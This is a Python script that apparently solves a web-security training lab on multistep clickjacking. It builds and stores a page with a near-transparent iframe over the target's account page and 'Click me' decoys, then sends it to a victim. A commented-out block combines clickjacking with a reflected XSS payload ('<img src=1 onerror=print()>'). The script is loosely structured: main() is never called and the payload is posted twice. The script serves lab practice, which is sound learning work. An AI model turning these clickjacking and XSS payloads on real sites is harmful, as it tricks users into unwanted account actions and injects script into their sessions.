import re
import sys
import requests
import string
import urllib.parse

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'


session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

#response = session.get(login_url)
#match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
#csrf_token = match.group(1)
#burp_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}
#session.post(login_url, data=burp_data)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<style>\r\n\tiframe {{\r\n\t\tposition:relative;\r\n\t\twidth:500px;\r\n\t\theight: 700px;\r\n\t\topacity: 0.00001;\r\n\t\tz-index: 2;\r\n\t}}\r\n   .firstClick, .secondClick {{\r\n\t\tposition:absolute;\r\n\t\ttop:500px;\r\n\t\tleft:50px;\r\n\t\tz-index: 1;\r\n\t}}\r\n   .secondClick {{\r\n\t\ttop:295px;\r\n\t\tleft:200px;\r\n\t}}\r\n</style>\r\n<div class=\"firstClick\">Click me first</div>\r\n<div class=\"secondClick\">Click me next</div>\r\n<iframe src=\"{burp_url}/my-account\"></iframe>", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)


#burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<style>\r\n    iframe {{\r\n        position:relative;\r\n        width:1000px;\r\n        height: 900px;\r\n        opacity: 0.1;\r\n        z-index: 2;\r\n    }}\r\n    div {{\r\n        position:absolute;\r\n        top:810px;\r\n        left:80px;\r\n        z-index: 1;\r\n    }}\r\n</style>\r\n<div>Click me</div>\r\n<iframe src=\"{burp_url}/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test\"></iframe>", "formAction": "STORE"}
#session.post(exploit_server, data=burp_data)

session.post(exploit_server, data=burp_data)

session.get(exploit_server+ '/deliver-to-victim')
